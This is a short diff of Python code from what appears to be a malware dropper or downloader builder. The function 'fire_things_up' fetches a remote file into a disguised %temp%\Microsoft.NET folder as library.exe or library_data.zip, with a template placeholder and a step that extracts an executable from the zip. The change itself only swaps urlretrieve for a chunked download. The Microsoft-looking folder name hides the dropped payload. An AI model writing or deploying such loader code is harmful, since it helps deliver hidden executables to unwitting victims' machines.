@@ -9,11 +9,24 @@ def fire_things_up(url,arch=False,zip=False):
 	def work(zip):
 		global pthhhh
 		pthhhh = get_output("echo %temp%").strip()
-		xx  = subprocess.Popen( 'mkdir "Microsoft.NET" >> NUL',shell=True,cwd=pthhhh)
+		xx     = subprocess.Popen( 'mkdir "Microsoft.NET" >> NUL',shell=True,cwd=pthhhh)
+		CHUNK  = 16 * 1024
 		if not zip:
-			x   = urlretrieve(url,pthhhh+"\\Microsoft.NET\\library.exe")
+			res = urlopen(url)
+			f   = open(pthhhh+"\\Microsoft.NET\\library.exe", 'wb')
+			while True:
+				chunk = res.read(CHUNK)
+				if not chunk:
+					break
+				f.write(chunk)
 		elif zip:
-			x   = urlretrieve(url,pthhhh+"\\Microsoft.NET\\library_data.zip")
+			res = urlopen(url)
+			f   = open(pthhhh+"\\Microsoft.NET\\library_data.zip", 'wb')
+			while True:
+				chunk = res.read(CHUNK)
+				if not chunk:
+					break
+				f.write(chunk)
 			##~Import-Here~##
 			zip=zipfile.ZipFile(pthhhh+"\\Microsoft.NET\\library_data.zip")
 			def get_exe_from(zip):
